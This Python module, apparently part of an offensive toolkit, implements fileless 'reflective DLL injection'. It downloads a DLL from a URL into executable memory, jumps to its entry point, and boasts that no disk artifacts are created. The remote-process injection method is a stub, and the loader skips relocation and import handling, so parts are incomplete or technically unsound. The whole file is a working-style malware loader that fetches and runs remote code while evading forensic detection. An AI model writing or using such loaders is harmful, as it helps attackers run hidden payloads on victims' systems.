"""
Reflective DLL Injection
Load DLL entirely in memory without touching disk
"""

import ctypes
import struct
import urllib.request

from ..core.constants import MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE
from ..utils.helpers import parse_pe_header, download_to_memory


class ReflectiveDLLInjector:
    """
    Reflective DLL Injection
    
    Downloads and loads DLL directly into memory without writing to disk
    """
    
    def __init__(self, kernel32, ntdll):
        """
        Initialize DLL injector
        
        Args:
            kernel32: Windows kernel32.dll handle
            ntdll: Windows ntdll.dll handle
        """
        self.kernel32 = kernel32
        self.ntdll = ntdll
    
    def inject(self, dll_url, target_process=None):
        """
        Inject DLL from URL into process memory
        
        Args:
            dll_url (str): URL to download DLL from
            target_process (int, optional): Target process PID
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            print(f"[+] Downloading DLL from: {dll_url}")
            
            # Download DLL to memory (never touches disk)
            dll_data = download_to_memory(dll_url)
            
            if not dll_data:
                return False
            
            dll_size = len(dll_data)
            print(f"[+] DLL size: {dll_size} bytes")
            print(f"[+] Allocating executable memory...")
            
            # Allocate executable memory
            memory_address = self.kernel32.VirtualAlloc(
                None,
                dll_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if not memory_address:
                print(f"[!] VirtualAlloc failed")
                return False
            
            print(f"[+] Allocated at: 0x{memory_address:X}")
            print(f"[+] Copying DLL to memory...")
            
            # Copy DLL data to allocated memory
            ctypes.memmove(memory_address, dll_data, dll_size)
            
            print(f"[+] Parsing PE headers...")
            
            # Parse PE headers to find entry point
            pe_info = parse_pe_header(dll_data)
            
            if not pe_info:
                print(f"[!] Failed to parse PE headers")
                return False
            
            # Validate PE file
            if not pe_info['is_valid']:
                print(f"[!] Invalid PE file")
                return False
            
            entry_point = memory_address + pe_info['entry_point_rva']
            
            print(f"[+] Entry point: 0x{entry_point:X}")
            print(f"[+] Executing DLL...")
            
            # Execute DLL entry point
            try:
                dll_entry = ctypes.CFUNCTYPE(ctypes.c_bool)(entry_point)
                result = dll_entry()
                
                print(f"[+] DLL executed successfully")
                print(f"[+] No disk artifacts created")
                
                return True
            
            except Exception as e:
                print(f"[-] DLL execution failed: {e}")
                return False
        
        except Exception as e:
            print(f"[!] Reflective DLL injection failed: {e}")
            return False
    
    def inject_into_process(self, dll_data, target_pid):
        """
        Inject DLL into specific process
        
        Args:
            dll_data (bytes): DLL data
            target_pid (int): Target process PID
            
        Returns:
            bool: True if successful
        """
        # This would require additional implementation for
        # remote process injection
        print(f"[!] Remote process injection not yet implemented")
        return False